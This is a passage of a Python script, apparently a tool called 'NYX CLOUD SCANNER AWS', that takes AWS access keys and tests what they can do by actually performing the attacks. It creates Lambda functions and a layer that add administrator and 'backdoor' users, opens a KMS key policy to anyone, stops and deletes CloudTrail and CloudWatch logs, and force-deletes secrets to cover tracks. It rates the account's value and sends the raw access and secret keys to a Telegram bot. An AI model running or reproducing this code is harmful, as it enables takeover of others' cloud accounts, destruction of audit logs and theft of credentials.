            current_service += 1; total_score += check_service('lambda_functions', lambda: lambda_client.list_functions(), current_service, total_services)
            current_service += 1; total_score += check_service('lambda_create_function', lambda: lambda_client.create_function(FunctionName='test-escalation', Runtime='python3.9', Role='arn:aws:iam::123456789012:role/test', Handler='index.handler', Code={'ZipFile': b'import boto3\ndef handler(event, context):\n    iam = boto3.client("iam")\n    iam.create_user(UserName="test-user")\n    iam.attach_user_policy(UserName="test-user", PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")\n    return {"statusCode": 200}'}), current_service, total_services)
            current_service += 1; total_score += check_service('lambda_invoke_function', lambda: lambda_client.invoke(FunctionName='test', Payload=b'{}'), current_service, total_services)
            current_service += 1; total_score += check_service('lambda_update_function_code', lambda: lambda_client.update_function_code(FunctionName='test', ZipFile=b'import boto3\ndef handler(event, context):\n    s3 = boto3.client("s3")\n    s3.create_bucket(Bucket="test-bucket")\n    return {"statusCode": 200}'), current_service, total_services)
            current_service += 1; total_score += check_service('lambda_delete_function', lambda: lambda_client.delete_function(FunctionName='test-function'), current_service, total_services)
            current_service += 1; total_score += check_service('lambda_get_function', lambda: lambda_client.get_function(FunctionName='test-function'), current_service, total_services)
            current_service += 1; total_score += check_service('lambda_update_function_configuration', lambda: lambda_client.update_function_configuration(FunctionName='test-function', Environment={'Variables': {'TEST_VAR': 'true'}}), current_service, total_services)
            current_service += 1; total_score += check_service('lambda_add_permission', lambda: lambda_client.add_permission(FunctionName='test-function', StatementId='test-permission', Action='lambda:InvokeFunction', Principal='*'), current_service, total_services)
            current_service += 1; total_score += check_service('lambda_publish_version', lambda: lambda_client.publish_version(FunctionName='test-function'), current_service, total_services)
            current_service += 1; total_score += check_service('lambda_create_layer_version', lambda: lambda_client.create_layer_version(LayerName='malicious-layer', Content={'ZipFile': b'import boto3\ndef malicious_function():\n    iam = boto3.client("iam")\n    iam.create_user(UserName="backdoor-user")\n    return "Privilege escalation successful"'}, CompatibleRuntimes=['python3.9']), current_service, total_services)
            
            # Проверяем результат критической эскалации Lambda
            check_escalation_block(' Lambda Privilege Escalation', ['lambda_functions', 'lambda_create_function', 'lambda_invoke_function', 'lambda_update_function_code', 'lambda_delete_function', 'lambda_get_function', 'lambda_update_function_configuration', 'lambda_add_permission', 'lambda_publish_version', 'lambda_create_layer_version'])
        
        
        # 🟡 ФЛОУ 8: ВЫСОКИЙ ПРИОРИТЕТ - Security & Compliance (Ключи и шифрование)
        if 'Security & Compliance' in flows_to_check:
            print(f"\n{Fore.WHITE}🔒  Security & Compliance{Fore.RESET}")
            current_service += 1; total_score += check_service('kms_keys', lambda: kms_client.list_keys(), current_service, total_services)
            current_service += 1; total_score += check_service('kms_aliases', lambda: kms_client.list_aliases(), current_service, total_services)
            current_service += 1; total_score += check_service('kms_create_key', lambda: kms_client.create_key(Description='malicious-key'), current_service, total_services)
            current_service += 1; total_score += check_service('kms_put_key_policy', lambda: kms_client.put_key_policy(KeyId='test-key-id', PolicyName='default', Policy='{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Principal": "*", "Action": "kms:*", "Resource": "*"}]}'), current_service, total_services)
            
            # Проверяем результат эскалации Security & Compliance
            check_escalation_block(' Security & Compliance', ['kms_keys', 'kms_aliases', 'kms_create_key', 'kms_put_key_policy'])
        
        # 🟢 ФЛОУ 9: СРЕДНИЙ ПРИОРИТЕТ - IAM Groups Escalation
        if 'IAM Groups Escalation' in flows_to_check:
            print(f"\n{Fore.WHITE}👥  IAM Groups Escalation{Fore.RESET}")
            current_service += 1; total_score += check_service('iam_users', lambda: iam_client.list_users(), current_service, total_services)
            current_service += 1; total_score += check_service('iam_groups', lambda: iam_client.list_groups(), current_service, total_services)
            current_service += 1; total_score += check_service('iam_create_group', lambda: iam_client.create_group(GroupName='test-escalation-group'), current_service, total_services)
            current_service += 1; total_score += check_service('iam_attach_group_policy', lambda: iam_client.attach_group_policy(GroupName='test', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'), current_service, total_services)
            current_service += 1; total_score += check_service('iam_add_user_to_group', lambda: iam_client.add_user_to_group(GroupName='test', UserName='test'), current_service, total_services)
            
            # Проверяем результат эскалации через группы
            check_escalation_block(' IAM Groups Escalation', ['iam_users', 'iam_groups', 'iam_create_group', 'iam_attach_group_policy', 'iam_add_user_to_group'])
        
        # 🔴 ФЛОУ 10: КРИТИЧЕСКИЙ - Log Deletion Attack (Сокрытие следов атак)
        if 'Log Deletion Attack' in flows_to_check:
            print(f"\n{Fore.RED}🗑️  Log Deletion Attack{Fore.RESET}")
            current_service += 1; total_score += check_service('cloudtrail_delete_trail', lambda: cloudtrail_client.delete_trail(Name='test-trail'), current_service, total_services)
            current_service += 1; total_score += check_service('cloudtrail_stop_logging', lambda: cloudtrail_client.stop_logging(Name='test-trail'), current_service, total_services)
            current_service += 1; total_score += check_service('cloudtrail_put_event_selectors', lambda: cloudtrail_client.put_event_selectors(TrailName='test-trail', EventSelectors=[{'ReadWriteType': 'ReadOnly', 'IncludeManagementEvents': False, 'DataResources': [{'Type': 'AWS::S3::Object', 'Values': ['arn:aws:s3:::malicious-bucket/*']}]}]), current_service, total_services)
            current_service += 1; total_score += check_service('cloudwatch_logs_delete_log_group', lambda: logs_client.delete_log_group(logGroupName='/aws/lambda/test-function'), current_service, total_services)
            current_service += 1; total_score += check_service('cloudwatch_logs_stop_logging', lambda: logs_client.stop_logging(logGroupName='/aws/lambda/test-function'), current_service, total_services)
            current_service += 1; total_score += check_service('cloudwatch_logs_put_retention_policy', lambda: logs_client.put_retention_policy(logGroupName='/aws/lambda/test-function', retentionInDays=1), current_service, total_services)
            current_service += 1; total_score += check_service('cloudwatch_logs_delete_log_stream', lambda: logs_client.delete_log_stream(logGroupName='/aws/lambda/test-function', logStreamName='test-stream'), current_service, total_services)
            current_service += 1; total_score += check_service('cloudwatch_delete_logs', lambda: logs_client.delete_log_group(logGroupName='/malicious/logs'), current_service, total_services)
            
            # Проверяем результат критической атаки на логи
            check_escalation_block(' Log Deletion Attack', ['cloudtrail_delete_trail', 'cloudtrail_stop_logging', 'cloudtrail_put_event_selectors', 'cloudwatch_logs_delete_log_group', 'cloudwatch_logs_stop_logging', 'cloudwatch_logs_put_retention_policy', 'cloudwatch_logs_delete_log_stream', 'cloudwatch_delete_logs'])
        
        # 🔴 ФЛОУ 11: КРИТИЧЕСКИЙ - Forensic Cleanup Attack (Очистка следов)
        if 'Forensic Cleanup Attack' in flows_to_check:
            print(f"\n{Fore.RED}🧹  Forensic Cleanup Attack{Fore.RESET}")
            current_service += 1; total_score += check_service('secrets_manager_delete_secret', lambda: secrets_client.delete_secret(SecretId='test-secret', ForceDeleteWithoutRecovery=True), current_service, total_services)
            current_service += 1; total_score += check_service('s3_delete_bucket', lambda: s3_client.delete_bucket(Bucket='test-malicious-bucket'), current_service, total_services)
            current_service += 1; total_score += check_service('lambda_delete_function', lambda: lambda_client.delete_function(FunctionName='test-malicious-function'), current_service, total_services)
            
            # Проверяем результат критической очистки
            check_escalation_block(' Forensic Cleanup Attack', ['secrets_manager_delete_secret', 's3_delete_bucket', 'lambda_delete_function'])
        
        
        print(f"{Fore.CYAN}{'─'*50}{Fore.RESET}")
        print()
        
        # 📊 СТАТИСТИКА ПРОИЗВОДИТЕЛЬНОСТИ
        self._print_performance_stats()
        
        return {
            'results': results,
            'total_score': total_score,
            'accessible_services': [name for name, result in results.items() if result['accessible']],
            'escalation_results': escalation_results,
            'performance_stats': self.performance_stats
        }
    
    def _print_performance_stats(self):
        """Выводит статистику производительности"""
        stats = self.performance_stats
        
        if stats['total_requests'] == 0:
            return
        
        success_rate = (stats['successful_requests'] / stats['total_requests']) * 100
        
        print(f"{Fore.CYAN}📊 СТАТИСТИКА ПРОИЗВОДИТЕЛЬНОСТИ{Fore.RESET}")
        print(f"{Fore.CYAN}{'─'*35}{Fore.RESET}")
        print(f"  Всего запросов: {Fore.WHITE}{stats['total_requests']}{Fore.RESET}")
        print(f"  Успешных: {Fore.GREEN}{stats['successful_requests']}{Fore.RESET}")
        print(f"  Ошибок: {Fore.RED}{stats['failed_requests']}{Fore.RESET}")
        print(f"  Успешность: {Fore.YELLOW}{success_rate:.1f}%{Fore.RESET}")
        
        # Показываем самые медленные сервисы
        if stats['service_response_times']:
            avg_times = {}
            for service, times in stats['service_response_times'].items():
                if times:
                    avg_times[service] = sum(times) / len(times)
            
            if avg_times:
                slowest_services = sorted(avg_times.items(), key=lambda x: x[1], reverse=True)[:3]
                print(f"  Самые медленные сервисы:")
                for service, avg_time in slowest_services:
                    print(f"    • {service}: {Fore.YELLOW}{avg_time:.2f}s{Fore.RESET}")
        
        print()
    
    def get_account_category(self, score: int) -> Dict[str, Any]:
        """Определяет категорию аккаунта по счету"""
        for category_key, category_info in self.account_categories.items():
            if score >= category_info['min_score']:
                return {**category_info, 'key': category_key}
        return self.account_categories['minimal']

# ============================================================================
# MAIN APPLICATION
# ============================================================================

def print_banner():
    """Выводит красивый баннер"""
    print()
    print(f"{Fore.YELLOW}      🔍 NYX CLOUD SCANNER AWS 🔍{Fore.RESET}")
    print(f"{Fore.WHITE}Professional AWS Security Analysis Module{Fore.RESET}")
    print(f"{Fore.CYAN}{'─'*50}{Fore.RESET}")
    print()

def print_section(title: str, color: str = Fore.CYAN):
    """Выводит заголовок секции"""
    print(f"\n{color}{'='*60}")
    print(f"{Style.BRIGHT}{title}")
    print(f"{'='*60}{Fore.RESET}")

def print_result_line(label: str, value: str, color: str = Fore.WHITE):
    """Выводит строку результата"""
    print(f"{Fore.BLUE}  {label}:{Fore.RESET} {color}{value}{Fore.RESET}")

def print_service_status(service: str, accessible: bool, score: int):
    """Выводит статус сервиса"""
    status = f"{Fore.GREEN}✅ ДОСТУПЕН{Fore.RESET}" if accessible else f"{Fore.RED}❌ НЕ ДОСТУПЕН{Fore.RESET}"
    print(f"    {service:<25} {status} {Fore.YELLOW}({score} pts){Fore.RESET}")

def main():
    """Основная функция"""
    print_banner()
    
    # Загружаем настройки из переменных окружения
    load_dotenv()
    
    # Получаем аргументы командной строки
    parser = argparse.ArgumentParser(description='AWS Key Checker - Professional Security Analysis')
    parser.add_argument('--access-key', '-a', required=True, help='AWS Access Key ID')
    parser.add_argument('--secret-key', '-s', required=True, help='AWS Secret Access Key')
    parser.add_argument('--region', '-r', default='us-east-1', help='AWS Region (default: us-east-1)')
    
    # Флаги для фильтрации по приоритетам
    parser.add_argument('--critical', action='store_true', help='Проверить только критические атаки (IAM, Secrets, Systems Manager, S3, EC2, Lambda, RDS)')
    parser.add_argument('--high', action='store_true', help='Проверить только высокоприоритетные атаки (Security & Compliance)')
    parser.add_argument('--medium', action='store_true', help='Проверить только среднеприоритетные атаки (IAM Groups, Container Services)')
    parser.add_argument('--low', action='store_true', help='Проверить только низкоприоритетные атаки (Management)')
    
    args = parser.parse_args()
    
    # Получаем учетные данные
    access_key = args.access_key
    secret_key = args.secret_key
    region = args.region
    
    # Определяем фильтры на основе флагов
    filters = {
        'critical': args.critical,
        'high': args.high,
        'medium': args.medium,
        'low': args.low
    }
    
    # Проверяем конфликты флагов
    priority_flags = [args.critical, args.high, args.medium, args.low]
    
    if sum(priority_flags) > 1:
        print(f"{Fore.RED}❌ Ошибка: Можно использовать только один флаг приоритета (--critical, --high, --medium, --low){Fore.RESET}")
        return
    
    # Инициализируем компоненты
    validator = AWSKeyValidator()
    
    # Настройки Telegram
    bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
    chat_id = os.getenv('TELEGRAM_CHAT_ID')
    telegram_notifier = TelegramNotifier(bot_token, chat_id) if bot_token and chat_id else None
    
    # Telegram уведомления уже выводятся в конструкторе TelegramNotifier
    
    start_time = time.time()
    
    try:
        # Валидируем ключи
        validation_result = validator.validate_key(access_key, secret_key, region)
        
        if not validation_result['success']:
            print(f"{Fore.RED}❌ Неверные учетные данные: {validation_result['error']}{Fore.RESET}")
            if telegram_notifier:
                telegram_notifier.send_message(f"❌ <b>ОШИБКА ВАЛИДАЦИИ</b>\n\nНеверные учетные данные: {validation_result['error']}")
            sys.exit(1)
        
        print(f"  Account ID: {Fore.GREEN}{validation_result['account_id']}{Fore.RESET}")
        print(f"  Username: {Fore.GREEN}{validation_result['username']}{Fore.RESET}")
        print(f"  ARN: {Fore.GREEN}{validation_result['arn']}{Fore.RESET}")
        print(f"  Region: {Fore.GREEN}{region}{Fore.RESET}")
        print(f"{Fore.CYAN}{'─'*50}{Fore.RESET}")
        print()
        
        # Проверяем права доступа
        permissions_result = validator.check_service_permissions(access_key, secret_key, region, filters)
        
        if 'error' in permissions_result:
            print(f"{Fore.RED}❌ Ошибка проверки прав: {permissions_result['error']}{Fore.RESET}")
            sys.exit(1)
        
        # Подсчитываем доступные сервисы для статистики
        accessible_count = sum(1 for result in permissions_result['results'].values() if result['accessible'])
        
        # Определяем категорию аккаунта
        total_score = permissions_result['total_score']
        category = validator.get_account_category(total_score)
        
        print(f"{Fore.CYAN}{'─'*50}{Fore.RESET}")
        print()
        print(f"  Общий счет: {Fore.YELLOW}{total_score}/60{Fore.RESET}")
        print(f"  Категория: {Fore.YELLOW}{category['emoji']} {category['name']}{Fore.RESET}")
        print(f"  Доступно сервисов: {Fore.YELLOW}{accessible_count}/{len(permissions_result['results'])}{Fore.RESET}")
        
        execution_time = time.time() - start_time
        print(f"  Время выполнения: {Fore.YELLOW}{execution_time:.2f} сек{Fore.RESET}")
        
        # Отправляем результат в Telegram
        if telegram_notifier:
            notification_data = {
                'account_id': validation_result['account_id'],
                'username': validation_result['username'],
                'arn': validation_result['arn'],
                'access_key': access_key,
                'secret_key': secret_key,
                'region': region,
                'score': total_score,
                'category': category['name'],
                'accessible_services': accessible_count,
                'total_services': len(permissions_result['results']),
                'execution_time': execution_time,
                'accessible_services_list': permissions_result['accessible_services']
            }
            
            success = telegram_notifier.send_validation_result(notification_data)
            if success:
                print()
                print(f"✅ Результат отправлен в Telegram!")
            else:
                print()
                print(f"❌ Ошибка отправки в Telegram")
        
        print(f"{Fore.CYAN}{'─'*50}{Fore.RESET}")
        print()
        print(f"{Fore.GREEN}✅ Все проверки выполнены успешно!{Fore.RESET}")
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}⏹️ Анализ прерван пользователем{Fore.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}❌ Неожиданная ошибка: {e}{Fore.RESET}")
        if telegram_notifier:
            telegram_notifier.send_message(f"❌ <b>ОШИБКА АНАЛИЗА</b>\n\nНеожиданная ошибка: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
